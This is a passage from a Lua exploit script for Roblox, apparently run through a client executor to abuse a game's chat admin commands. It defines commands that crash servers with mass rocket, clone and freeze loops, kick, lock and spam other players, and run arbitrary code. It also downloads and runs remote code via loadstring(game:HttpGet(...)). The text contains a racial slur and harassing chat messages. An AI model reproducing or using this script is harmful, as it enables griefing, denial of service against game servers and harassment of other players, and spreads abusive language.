		local cf = lp.Character.HumanoidRootPart
		local setdadamncframe = true
		local thedollar = wawawaa
		spawn(function()
        repeat game:GetService("RunService").RenderStepped:Wait()
        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = thedollar
        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
        until not setdadamncframe
        end)
		wait(0.2)
        setdadamncframe = false
		lp.Character.IvoryPeriastron.Remote:FireServer(Enum.KeyCode.E)
		cf.Anchored = false
		local looping = true
		local thedollarsecondary = Instance.new("Part",cf.Parent)
		thedollarsecondary.Anchored = true
		thedollarsecondary.Size = Vector3.new(10,1,10)
		thedollarsecondary.CFrame = (target.CFrame * CFrame.new(-1*(target.Size.X/2)-(lp.Character['Torso'].Size.X/2), 0, 0)) * CFrame.new(0,-3.5,0)
		spawn(function()
			while true do
				game:GetService('RunService').Heartbeat:wait()
				game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
				target.RotVelocity = Vector3.new(0,0,0)
		                target.Velocity = Vector3.new(0,0,0)
		                cf.Velocity = Vector3.new(0,0,0)
		                cf.RotVelocity = Vector3.new(0,0,0)
			    cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(lp.Character['Torso'].Size.X/2), 0, 0)
				if not looping then break end
			end
		end)
		spawn(function() while looping do game:GetService('RunService').Heartbeat:wait() game:GetService("Players"):Chat('unpunish me') end end)
		wait(0.3)
		looping = false
		lp.Character.IvoryPeriastron.Remote:FireServer(Enum.KeyCode.E)
		wait(0.3)
		game:GetService("Players"):Chat("respawn me")
		
	end
end

function getSoundId(githubLink,fileName)
    if not isfolder("LocalMusic") then makefolder("LocalMusic") end
    if not isfile("LocalMusic/"..tostring(fileName)..".mp3") then
        writefile("LocalMusic/"..tostring(fileName)..".mp3",HttpRequest({Url=githubLink, Method='GET'}).Body)
    end
    return getcustomasset("LocalMusic/"..tostring(fileName)..".mp3")
end

function fixNet() -- vekco again with jove
	setsimulationradius(999.999,math.huge)
	settings().Physics.AllowSleep = false
	settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
	sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 999.999)
	sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge)
end

function splitPart(part) -- vekco with love
	local currentSize = part.Size
	local splits = Vector3.new(
		math.ceil(currentSize.X / 10),
		math.ceil(currentSize.Y / 10),
		math.ceil(currentSize.Z / 10)
	)
	local splitCount = splits.X * splits.Y * splits.Z
	local originalCFrame = part.CFrame
	local newParts = {}
	local offsetX = currentSize.X / splits.X
	local offsetY = currentSize.Y / splits.Y
	local offsetZ = currentSize.Z / splits.Z
	local startOffset = CFrame.new(
		(-currentSize.X / 2) + (offsetX / 2),
		(-currentSize.Y / 2) + (offsetY / 2),
		(-currentSize.Z / 2) + (offsetZ / 2)
	)
	for x = 1, splits.X do
		for y = 1, splits.Y do
			for z = 1, splits.Z do
				local splitPart = part:Clone()
				local newSizeX = math.min(offsetX, currentSize.X - (x - 1) * offsetX)
				local newSizeY = math.min(offsetY, currentSize.Y - (y - 1) * offsetY)
				local newSizeZ = math.min(offsetZ, currentSize.Z - (z - 1) * offsetZ)
				splitPart.Size = Vector3.new(newSizeX, newSizeY, newSizeZ)
				local positionOffset = startOffset * CFrame.new((x - 1) * offsetX, (y - 1) * offsetY, (z - 1) * offsetZ)
				splitPart.CFrame = originalCFrame * positionOffset
				splitPart.Parent = workspace
				table.insert(newParts, splitPart)
			end
		end
	end
	part:Destroy()

	return newParts, splitCount
end

function addCommand(name,args,func)
    table.insert(commandlist,{name,args,func})
end

function runCommand(param1,specargs)
    for i,asdfuhiswuejfniuserf in pairs(commandlist) do
        if prefix..asdfuhiswuejfniuserf[1] == param1 and running then
            if #specargs > #asdfuhiswuejfniuserf[2]-1 then
		pcall(function()
            local s,f = pcall(asdfuhiswuejfniuserf[3](specargs))
            if not s then if consoleOn then print(f) end end
end)
            return
            else
                local lister = prefix..asdfuhiswuejfniuserf[1].." "
                for i,d in pairs(asdfuhiswuejfniuserf[2]) do lister = lister..d.." " end
                GUI:SendMessage(ScriptName, "\n\nThe command you have recently sent is not properly formatted.\n The correct format is: \n "..lister)
            end
        end
    end
end

function getCommand(param1)
    local fat={}
    for i,v in pairs(commandlist) do
        if param1:lower() == v[1]:lower():sub(1,#param1) and not table.find(fat,v) then
        table.insert(fat,v)
        end
        end
    return fat
end

addCommand("cmds",{},function()
    if consoleOn then print("-:COMMANDS ["..tostring(#commandlist).."]:-") end
    for i,v in pairs(commandlist) do
        local lister = ""
        for i,d in pairs(v[2]) do lister = lister..d.." " end
        if consoleOn then print(v[1].." "..lister)end
    end
    GUI:SendMessage(ScriptName, "Check the developer console for the commands.")
end)

addCommand("prefix",{"newprefix"},function(args)
    prefix = args[1]
    GUI:SendMessage(ScriptName, "Set prefix to "..prefix.." successfully.")
end)

addCommand("customcolor",{"r","g","b"},function(args)
	CustomColor = Color3.fromRGB(args[1],args[2],args[3])
	GUI:SendMessage(ScriptName, "Set custom color successfully.")
end)

addCommand("scriptname",{"name"},function(args)
    local fixer = args[1]
	for i=2,#args do
		fixer=fixer.." "..args[i]	
	end
	ScriptName = fixer
    GUI:SendMessage(ScriptName, "Set script name to "..ScriptName.." successfully.")
end)

addCommand("altcmds",{},function()
    for i,v in pairs(commandlist) do
        local lister = ""
        for i,d in pairs(v[2]) do lister = lister..d.." " end
        game.Players:Chat("ff "..v[1].." "..lister)
        wait()
    end
    wait()
    game.Players:Chat("ff -:COMMANDS ["..tostring(#commandlist).."]:-")
    wait()
    GUI:SendMessage(ScriptName, "Check logs for list of commands.")
end)

addCommand("run",{"script"},function(args)
    local s,f=pcall(function()
    local fixer = [[local owner = game.Players.LocalPlayer
local player = owner
local localplayer = owner
local lp = owner
local plr = owner
local chr,character,char = owner.Character
local consoleOn = true
game:GetService("RunService").RenderStepped:Connect(function()
    chr=owner.Character
end)
function GetPlayers(jjk)
local boss = lp
local fat = {}
if jjk:lower() == "me" then 
return {boss} 

elseif jjk:lower() == "all" or jjk:lower() == "*" then 
return game:GetService("Players"):GetChildren() 

elseif jjk:lower() == "others" then
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v.Name ~= boss.Name then
table.insert(fat,v)
end
end
return fat

elseif jjk:lower() == "random" then
return {game:GetService("Players"):GetChildren()[math.random(1,#game:GetService("Players"):GetChildren())]}

else
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if jjk:lower() == v.Name:lower():sub(1,#jjk) and not table.find(fat,v) then
table.insert(fat,v)
end
end
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if jjk:lower() == v.DisplayName:lower():sub(1,#jjk) and not table.find(fat,v) then
table.insert(fat,v)
end
end
return fat
end

end
]]
    fixer = fixer..args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    loadstring(fixer)()
    end)if not s then print(f)end
end)

addCommand("runcommand",{"command"},function(args)
    local message = args[1]
                for i=2, #args do
                        if args[i]=="<%RANDOMSTRING%>" then
                            local asuhdyuasd=""
                            for i=1,25 do
                            asuhdyuasd=asuhdyuasd..lettersTableFormat[math.random(#lettersTableFormat)]
                            end
                            
                            message = message.." "..asuhdyuasd
                        elseif args[i]==[[\n]] then
                        message = message.." ".."\n"
                        else
                        message = message.." "..args[i]
                        end
                end
    game.Players:Chat(message)
end)

addCommand("kick",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
    game.Players:Chat(".unantiabuse")
	game.Players:Chat("respawn "..v.Name)
        wait(.25)
        game.Players:Chat("rocket/"..v.Name)
        wait(.25)
        game.Players:Chat("jail/"..v.Name)
        game.Players:Chat("blind "..v.Name)
        game.Players:Chat("ff "..v.Name)
		task.wait(.23)
Loops.rk = true
repeat wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame *CFrame.new(0,0,2) * CFrame.Angles(0,math.rad(180),0)
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name)  
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name)
until not Loops.rk
	end
end)

addCommand("skick",{},function()
Loops.rk = false
game.Players:Chat("unrocket/all/all/all")
game.Players:Chat("unrocket/all/all/all")
game.Players:Chat("unrocket/all/all/all")
game.Players:Chat("unrocket/all/all/all")
game.Players:Chat("unrocket/all/all/all")
game.Players:Chat(".antiabuse")
end)

addCommand("ban",{"player"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
        table.insert(Banned,v.Name)
        if BanSoundsEnabled then
            runCommand(prefix.."rkicksound",{v.Name,BanSound})
        else
            runCommand(prefix.."kick",{v.Name})
        end
    end
end)
               
plr.Chatted:Connect(function(sadnigga)
if string.sub(sadnigga, 1) == ".sad" then
game.Players:Chat("music 00000000000000000000000000000000000000006806140478")
for i = 1,10 do
game.Players:Chat(".spamlogs")
end
end
end)

plr.Chatted:Connect(function(msc)
if string.sub(msc, 1) == ".musicids" then
print("9043892984, 200, dele mami")
print("9043878179, 200, Kikbak ft Styliztik & Kaisha")
print("1840040963, 200, Rhythm")
print("1841443579, 200, tripping on love")
print("7029017448, 206, play it cool - terry zchong")
print("1846808350, 200, get up and boogy")
print("7023741506, 200, Elypsis - i miss you")
print("1848220276, 200, different than normal")
print("9042523170, 200, come closer -- reginald keith")
print("9043876028, 200, flexxin on the gram")
print("9043893928, 200, sin remordimientos")
print("9043870264, 200, shumba - real friend")
print("6901063458, 200, rihanna SOS")
print("7024035759, 250, dexter king - get to know you")
print("1835662728, 200, unknown")
print("29040163991, 200, Soviet Anthem")
print("1836807218, 200, soarcrash")
print("183736729, 201, Hound Dogs of Love")
print("1840003540, 200, Tell it to yourself")
print("1838488910, 230, Take the Road")
print("1837871444, 230, Your love is Anarchy")
print("1843324953, 235, Night out")
print("1840047556, 235, So bad - Juice music")
print("1838569831, 235, Never gonna give you up")
print("1837258874, 131, la cucaracha😃😜😀")
print("1843434135, 235, Twisted Love")
print("1837881688, 185, Shattered Heart")
print("1837848096, 220, Feels good to Cry")
print("9042524725, 33, Space")
print("9045373969, 235, A lo Caliche")
print("9047105584, 235, On the Verge")
print("1836736337, 235, Just Wanna Dance")
print("1836736337, 140, Fur immer deutsch<3")
print("1836736337, 80, Wandering")
print("1845932062, 234, Vuelve A Mi A")
print("1836743584, 235, You Aint Hot")
print("1840041842, 190, Till the Mornin")
print("6708444383, 190, beats")
print("6924735395, 150, Every time")
print("13530438299, 140, Beats")
print("6942391979, 170, ariashot")
print("6913550990, 200, FNAF")
print("1846458016, 200, no more")
print("6924735395, 200, For me")
print("1838457617, 200, Clair De Lune")
print("6872126938, 200, Young - Vacations")
print("6823597327, 200, Brooklyn Blood Pop")
print("9047050075, 200, Lofi Hiphop")
print("9043887091, 200, Lofi Chill")
print("1839707719, 200, Sweet Dance Song")
print("1837870681, 200, Autumn Leaves")
print("5410082534, 150, dubstep")
print("5410082097, 200, Bad Computer")
print("5410080857, 200, F.O.O.L & Midranger - Neon")
print("5410084346, 240, Pixel Terror - Amnesia")
print("1837843587, 220, a Bit of Rock")
print("6828176320, 200, Rolling Stones - Paint it Black")
print("6772846771, 230, Thats a bop")
print("6806140478, 150, Sad N**ga Hours")
print("6953866301, 140, MONTAGEM - EMPINA NA ONDA")
print("6788646778, 200, Hella Sketchy - Rare Gem")
print("7006487793, 200, Saw you at the Party")
print("6973084731, 230, Britney Speirs - Till the World Ends")
print("6925558165, 200, Situation Critical - Platinum Blonde")
print("6781116057, 200, Deja Vu")
print("6707901601, 200, Wir sind Drin")
print("6705612961, 200, Luss")
end
end)

plr.Chatted:Connect(function(potatocrash)
if string.sub(potatocrash, 1) == ".potatocrash" then

game.Players:Chat("gear me 00000000000000000000000000000000000000000000000000004842207161")
task.wait()
game.Players:Chat("ungear me")
game.Players:Chat("respawn                                                                                                                     others")
task.wait(.23)
game.Players:Chat("freeze                                                                                                                     others")
game.Players:Chat("size                                                                                                                     others nan")
game.Players:Chat("fogend ")
game.Players:Chat("time -")
game.Players:Chat("fogcolor 0 0 0")
game.Players:Chat("name                                                                                                                     others ")
game.Players:Chat("music                                                                                                                      25320997")
task.wait(.23)
for i = 1,5 do
game.Players:Chat("pm/ others \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n You have been potatokicked from this server. \n\n\npotato kick has returned!\n\n\nunleaked method.\n\n\nNo server is safe! \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
game.Players:Chat("pm/ others \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n You have been potatokicked from this server. \n\n\npotato kick has returned!\n\n\nunleaked method.\n\n\nNo server is safe! \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
end
task.wait(.85)
-- skidded by atprog for realz
for i = 1,150 do
game.Players:Chat("shield/all/all/all")
game.Players:Chat("rocket/all/all/all")
game.Players:Chat("normal/all/all/all")
game.Players:Chat("shield/all/all/all")
game.Players:Chat("normal/all/all/all")
game.Players:Chat("rocket/all/all/all")
game.Players:Chat("normal/all/all/all")
game.Players:Chat("shield/all/all/all")
game.Players:Chat("rocket/all/all/all")
end
game.Players:Chat("ff/all")
game.Players:Chat("explode/all/all/all")
game.Players:Chat("tp/all/me")
for i = 1,200 do
game.Players:Chat("shield/all/all/all")
game.Players:Chat("rocket/all/all/all")
game.Players:Chat("shield/all/all/all")
game.Players:Chat("rocket/all/all/all")
game.Players:Chat("normal/all/all/all")
game.Players:Chat("normal/all/all/all")
game.Players:Chat("shield/all/all/all")
game.Players:Chat("rocket/all/all/all")
game.Players:Chat("shield/all/all/all")
game.Players:Chat("rocket/all/all/all")
end
end
end)

addCommand("lock",{"player"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
	Connections["_SOFTLOCK"..v.Name] = game:GetService("RunService").RenderStepped:Connect(function()
        	if not v then Connections["_SOFTLOCK"..v.Name]:Disconnect() error("Break") end
        	pcall(function()
			if PunishSoftlock then
			fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector)
				if v and v.Character and v.Character.Parent ~= game.Lighting then
					game.Players:Chat("punish "..v.Name)
					v.Character.Parent = game.Lighting
				end
        		if not v.Character:FindFirstChildOfClass("Model") then
        game.Players:Chat("clone " ..v.Name)
            			game.Players:Chat("name "..v.Name..[[ []]..ScriptName..[[]
atprog groomed me.]])
        		end

        
			end
        	end)
    	end)
    end
end)

addCommand("unlock",{"player"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
	pcall(function()
		Connections["_SOFTLOCK"..v.Name]:Disconnect()
		if PunishSoftlock then
			game.Players:Chat("unpunish "..v.Name)
		end
	end)
    end
end)

addCommand("unban",{"player"},function(args)
    for i,v in pairs(Player) do
        if table.find(Banned,v.Name) then
            table.remove(Banned,table.find(Banned,v.Name))
        end
    end
end)

addCommand("crash",{},function()
	for i=1,5 do
		game.Players:Chat("size all .3")
	end
	for i=1,13 do
		game.Players:Chat("rocket/all all all")
		game.Players:Chat("freeze all all all")
		game.Players:Chat("dog all all all")
	end
	for i=1,5 do
		game.Players:Chat("size all 10")
	end
	for i=1,200 do
		game.Players:Chat("clone all all all")
	end
end)


addCommand("vg",{},function()
  game.Players:Chat(".unantiservercrash")
  wait(0.5)
  game.Players:Chat("char all 1389780396")
  wait(0.5)
  game.Players:Chat("gear me 94794847")
  repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
  game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher").Parent = game.Players.LocalPlayer.Character
  repeat wait() until not game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Coffin")
  repeat wait() until game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Remote")
  game.Players.LocalPlayer.Character.VampireVanquisher.Remote:FireServer(Enum.KeyCode.Q)
  for i=1,5 do
      game.Players:Chat("size me 0.3")
  end
  wait(2)
  game.Players:Chat(".antiservercrash")
end)

addCommand("prshutdown",{},function()
  game.Players:Chat("fogend 0")
  game.Players:Chat("fogcolor 0 0 0")
  game.Players:Chat("time 0")
  if PersonsAdmin then
  game.Players:Chat([[h/























##########################################
PR SCRIPT XD
##########################################]])
else
game.Players:Chat([[h 
























##########################################
PR SCRIPT XD
##########################################]])
end
  runCommand(prefix.."playbypass",{"syko"})
  wait()
  runCommand(prefix.."vg",{})
  spawn(function()
      wait(0.5)
      runCommand(prefix.."shutdown",{})
  end)
end)

player.Chatted:Connect(function(message)
    if string.sub(message, 1, 9) == ".subzero " then
          local name = string.sub(message, 10)
                game.Players:Chat("gear " .. name .. " 0000000000000000000000000000000000000000000000000087361662")
                game.Players:Chat("gear " .. name .. " 0000000000000000000000000000000000000000000000000066896601")
  end
  end)
  
            player.Chatted:Connect(function(message)
    if string.sub(message, 1) == ".subzero" then
                game.Players:Chat("gear me 0000000000000000000000000000000000000000000000000087361662")
                game.Players:Chat("gear me 0000000000000000000000000000000000000000000000000066896601")
                end
                end)

player.Chatted:Connect(function(message)
    if string.sub(message, 1) == ".rocket" then

      
            game.Players:Chat("gear me 000000000000000000000000000000000067747912")
            end
            end)

player.Chatted:Connect(function(message)
    if string.sub(message, 1) == ".ice" then

      
            game.Players:Chat("gear me 0000000000000000000000000000000000261439002")
            game.Players:Chat("gear me 0000000000000000000000000000000000261439002")
            game.Players:Chat("gear me 0000000000000000000000000000000000261439002")
           
           end
           end)

game.Players.LocalPlayer.Chatted:Connect(function(message)
  if string.sub(message, 1, 6) == ".char " then
    local totalId = game.Players:GetUserIdFromNameAsync(string.sub(message, 7))
    game.Players:Chat(":char me " .. totalId)
  end
end)

player.Chatted:Connect(function(message)
    if string.sub(message, 1, 4) == ".pr " then
      local name = string.sub(message, 5)
      
            game.Players:Chat("gear " .. name .. " 000000000000000000000000000000000068539623")
            game.Players:Chat("gear " .. name .. " 0000000000000000000000000000000000583030187")
      game.Players:Chat("gear " .. name .. " 0000000000000000000000000000000000000123234673")
      game.Players:Chat("pm " .. name .. " You Got My Old Gears :)")
    end
end)

      plr.Chatted:Connect(function(pa)
          if string.sub(pa, 1) == (".pa") then

      game.Players:Chat("punish others")
      game.Players:Chat("h Succesfully Punished All")

      end
      end)

      game.Players.LocalPlayer.Chatted:connect(function(owner1)
  if string.sub(owner1, 1) == (".owner") then
  game.Players:Chat("m OWNER OF THIS SCRIPT IS ATPROG (PR)")
  end
  end)

  game.Players.LocalPlayer.Chatted:connect(function(owner2)
  if string.sub(owner2, 1) == (".owner2") then
  game.Players:Chat("m HELPER OF THIS SCRIPT IS ICESTUDS")
  end
  end)

player.Chatted:Connect(function(msg)
if msg:sub(1, 7) == ".super " then

for i = 1, 200 do 
game.Players:Chat(msg:sub(8))

end
end
end)

player.Chatted:Connect(function(message)
   if string.sub(message, 1) == ".fe" then
   game.Players:Chat("gear me 0000000000000000000000000000000000000000000000000051346471")
   end
   end)

player.Chatted:Connect(function(sabotage)
   if string.sub(sabotage, 1, 10) == ".sabotage " then
   local name = string.sub(sabotage, 11)
   
   game.Players:Chat(".spam pm/" .. name .. "/🖤💀😃😚🖤💀😃⚫🖤💀😃🖤⚫😃😗🖤💀😃😗🖤😄😃😗🖤😗🖤😚😃😗🖤😄😃💀🖤😃😚🇸🇷😄😃😄🖤😗🖤🥰😃😗🖤😄😃🖤😗😃😄🖤😗😃😄🖤💀😃😚🖤💀😃🖤😚😃💀🇸🇷😚😃💀😃😚♥️😄😭😚♥️😄🖤🤣♥️😃💀😃😚🖤💀♥️😄😃💀😃??🖤💀♥️🤣😃😄🥳😚😃😄🥳😚😃🥰😃🥳😚😗😃🥳😄😭🇹🇷😂🥰🖤💀♥️😗😙😚😃😗🖤😄😃😗🇸🇷😄😃😭😗😃💀🖤💀")
   end
   end)
   
   player.Chatted:Connect(function(unsabotage)
   if string.sub(unsabotage, 11) == ".unsabotage" then
   
   game.Players:Chat(".unspam")
   end
   end)

player.Chatted:Connect(function(message)
    if string.sub(message, 1, 6) == ".nuke " then
        local name = string.sub(message, 7)
       
       for i = 1,200 do
       
       game.Players:Chat("respawn " ..name)
       wait(0.06)
       game.Players:Chat("explode " ..name)
       wait(0.06)
       end
       game.Players:Chat("respawn " ..name)
       end
       end)
        
        player.Chatted:Connect(function(fixcam)
        if string.sub(fixcam, 1) == "fixcam" then
        local lp = game.Players.LocalPlayer local ui = game:GetService("UserInputService") local contextActionService = game:GetService("ContextActionService") local runService = game:GetService("RunService") contextActionService:UnbindAction("ShoulderCameraSprint") runService:UnbindFromRenderStep("ShoulderCameraUpdate") contextActionService:UnbindAction("ShoulderCameraZoom") while true do wait() repeat runService.Heartbeat:Wait() until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable runService:UnbindFromRenderStep("ShoulderCameraUpdate") contextActionService:UnbindAction("ShoulderCameraZoom") contextActionService:UnbindAction("ShoulderCameraSprint") local weaponSystem = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem') if not weaponSystem then return end for _, v in pairs(weaponSystem:GetDescendants()) do if v:IsA("Script") then v.Disabled = true end v:Destroy() end local weaponScript = lp.PlayerGui:FindFirstChild("ClientWeaponsScript") local weaponGui = lp.PlayerGui:FindFirstChild("WeaponsSystemGui") local clientWeaponScript = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript") if weaponScript then weaponScript.Disabled = true weaponScript:Destroy() end if weaponGui then weaponGui:Destroy() end if clientWeaponScript then clientWeaponScript.Disabled = true clientWeaponScript:Destroy() end game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default ui.MouseIconEnabled = true lp.CameraMaxZoomDistance = 400 lp.CameraMinZoomDistance = 0.5 local camera = game:GetService("Workspace"):FindFirstChild("Camera") if camera then camera.FieldOfView = 70 end game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid lp.Character.Humanoid.AutoRotate = true end
        end
        end)

player.Chatted:Connect(function(message)
    if string.sub(message, 1) == ".perm2" then
    game.Players:Chat(".admin")
    end
    end)

player.Chatted:Connect(function(message)
    if string.sub(message, 1, 6) == ".bend " then
        local name = string.sub(message, 7)
        
game.Players:Chat("rocket/"..name)
wait(.5)
game.Players:Chat("freeze "..name)
game.Players:Chat("unrocket/"..name)
wait(.34)
game.Players:Chat("name "..name.." "..name)
wait(.34)
game.Players:Chat("thaw "..name)
wait(.34)
game.Players:Chat("unseizure "..name)
game.Players:Chat("tp "..name.." "..name)
game.Players:Chat("sit "..name)
end
end)

-- Function to handle chat messages for existing players
local function HandleExistingPlayers(player)
    local isSpamming = false

    player.Chatted:Connect(function(message)
        -- Check if the message sender is the local player
        if player == game.Players.LocalPlayer then
            if message:sub(1, 6) == ".spam " then
                -- Extract the message after ".spam "
                local spamMessage = message:sub(7)
                local stopCommand = ".unspam"

                isSpamming = true

                while isSpamming do
                    game.Players:Chat(spamMessage)
                    task.wait(0.1) -- Adjust the wait time between messages if needed
                end

                -- Add your custom logic here
            elseif message:lower() == ".unspam" then
                -- Stop the spam when .unspam is received
                isSpamming = false
            end
        end
    end)
end

-- Connect the Chatted event for existing players when the script starts
for _, player in pairs(game.Players:GetPlayers()) do
    HandleExistingPlayers(player)
end

-- Connect the Chatted event for subsequent joins
game.Players.PlayerAdded:Connect(HandleExistingPlayers)

game.Players.LocalPlayer.Chatted:Connect(function(message)
    if string.sub(message:lower(), 1, 9) == ".hatspam " then
        local targetNamePart = string.sub(message, 10)
        for i, v in pairs(game.Players:GetPlayers()) do
            if v.Name:lower() == targetNamePart:lower() then
                for j = 1, 50 do
                    game.Players:Chat("hat " .. v.Name .. " 33070696")
                end
                break
            end
        end
    end
end)

plr.Chatted:Connect(function(egirl)
if string.sub(egirl, 1) == (".girl") then

game.Players:Chat("music 0000000000000000000000000000000000000000000006823597327")
end
end)

plr.Chatted:Connect(function(fnaf)
   if string.sub(fnaf, 1) == (".fnaf") then
   game.Players:Chat("music 0000000000000000000000000000000000000000000000000000000000000000000006913550990")
   wait(.25)
   game.Players:Chat("h Now Playing -It's Been So Long- :)")
     end
       end)
   
   game.Players.LocalPlayer.Chatted:Connect(function(iy)
if string.sub(iy, 1) == "iy" then
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end
end)

game.Players.LocalPlayer.Chatted:Connect(function(iycmd)
if string.sub(iycmd, 1, 4) == "iyc " then
local msg = string.sub(iycmd, 5)
execCmd(msg)
end
end)

addCommand("age",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
game.Players:Chat(".chat [PR SCRIPT] "..v.Name.." Joined ROBLOX: " ..v.AccountAge.. " Day Ago!")
end
end)

game.Players.LocalPlayer.Chatted:Connect(function(bang)
if string.sub(bang, 1, 6) == ".bang " then
local name = string.sub(bang, 7)
game.Players:Chat("iy")
game.Players:Chat("iyc bang " ..name.. " 9999")
end
end)

game.Players.LocalPlayer.Chatted:Connect(function(iy)
if string.sub(iy, 1) == "iy" then
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end
end)

plr.Chatted:Connect(function(poop)
          if string.sub(poop, 1) == "#lock" then
          game.Players:Chat("char all 1389780396")
          wait(1)
          game.Players:Chat(".lock others")
          game.Players:Chat("reset others")
          game.Players:Chat("h #LOCKED,CRASHED CRY ABT IT")
          wait(0.50) 
          for i = 1,128 do
          game.Players:Chat("dog all all all fuck")
          game.Players:Chat("clone all all all fuck")
          game.Players:Chat("rocket/all/all/all fuck")
          game.Players:Chat("shield/all/all/all fuck")
          game.Players:Chat("freeze all all all")
          game.Players:Chat("size all .3")
          end
          end
          end)

plr.Chatted:Connect(function(vg2)
          if string.sub(vg2, 1) == ".vg2" then
          game.Players:Chat("h/VG CRASH BUT BETTER")
          game.Players:Chat("h VG CRASH BUT BETTER")
          game.Players:Chat(".vg")
          wait(1)
          for i = 1,128 do
          game.Players:Chat("dog all all all fuck")
          game.Players:Chat("clone all all all fuck")
          game.Players:Chat("rocket/all/all/all fuck")
          game.Players:Chat("shield/all/all/all fuck")
          game.Players:Chat("freeze all all all")
          game.Players:Chat("size all .3")
          end
          end
          end)

plr.Chatted:Connect(function(vg3)
          if string.sub(vg3, 1) == ".vg3" then
          game.Players:Chat("h/VG CRASHED BY ATPROG")
          game.Players:Chat("h VG CRASHED BY ATPROG")
          game.Players:Chat("m PR SCRIPT")
          game.Players:Chat(".vg")
          wait(1)
          for i = 1,128 do
          game.Players:Chat("dog all all all fuck")
          game.Players:Chat("clone all all all fuck")
          game.Players:Chat("rocket/all/all/all fuck")
          game.Players:Chat("shield/all/all/all fuck")
          game.Players:Chat("freeze all all all")
          game.Players:Chat("size all .3")
          end
          end
          end)

plr.Chatted:Connect(function(swagify)
          if string.sub(swagify, 1) == ".swagifycrash" then
          game.Players:Chat("h/SWAGIFY CRASHED BY ATPROG")
          game.Players:Chat("h SWAGIFY CRASHED BY ATPROG")
          game.Players:Chat("m PR SCRIPT")
          game.Players:Chat("swagify all all all all all all all all all all all all all all all all all all")
          wait(1)
          for i = 1,128 do
          game.Players:Chat("dog all all all fuck")
          game.Players:Chat("clone all all all fuck")
          game.Players:Chat("rocket/all/all/all fuck")
          game.Players:Chat("shield/all/all/all fuck")
          game.Players:Chat("freeze all all all")
          game.Players:Chat("size all .3")
          end
          end
          end)

plr.Chatted:Connect(function(partcrash)
          if string.sub(partcrash, 1) == ".partcrash" then
          game.Players:Chat("char all 1389780396")
          game.Players:Chat("h/PART CRASH")
          for i = 1,25 do
          game.Players:Chat("part/10/10/10")
          end
          wait(1)
          for i = 1,128 do
          game.Players:Chat("dog all all all fuck")
          game.Players:Chat("clone all all all fuck")
          game.Players:Chat("rocket/all/all/all fuck")
          game.Players:Chat("shield/all/all/all fuck")
          game.Players:Chat("freeze all all all")
          game.Players:Chat("size all .3")
          end
          end
          end)

plr.Chatted:Connect(function(femify)
          if string.sub(femify, 1) == ".femifycrash" then
          game.Players:Chat("char others 3221")
           game.Players:Chat("h FEM CRASHED BY ATPROG")
